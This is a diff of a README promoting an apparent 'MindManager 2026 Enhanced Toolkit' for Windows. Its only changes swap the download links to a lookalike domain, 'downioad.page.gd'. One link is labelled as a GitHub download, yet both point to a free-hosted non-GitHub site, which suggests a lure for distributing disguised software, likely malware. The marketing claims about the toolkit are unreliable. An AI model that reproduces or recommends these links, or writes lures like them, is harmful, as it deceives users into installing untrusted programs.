@@ -2,7 +2,7 @@
 
 Mindjet MindManager 2026 Enhanced Toolkit is a powerful set of utilities designed to elevate your mind mapping to new heights. Whether you're a business professional, student, or creative thinker, this toolkit provides the tools you need to organize, visualize, and share your ideas more effectively. Built for Windows 10 and 11, it integrates seamlessly with MindManager 2026, offering a range of features that enhance productivity and creativity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -65,6 +65,6 @@ Yes, we offer technical support through our website. You can visit the support p
 
 To get started, download the latest version of the Mindjet MindManager 2026 Enhanced Toolkit from our official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This toolkit is provided as-is, and we encourage users to explore its features to enhance their mind mapping workflow. Thank you for choosing the Mindjet MindManager 2026 Enhanced Toolkit!
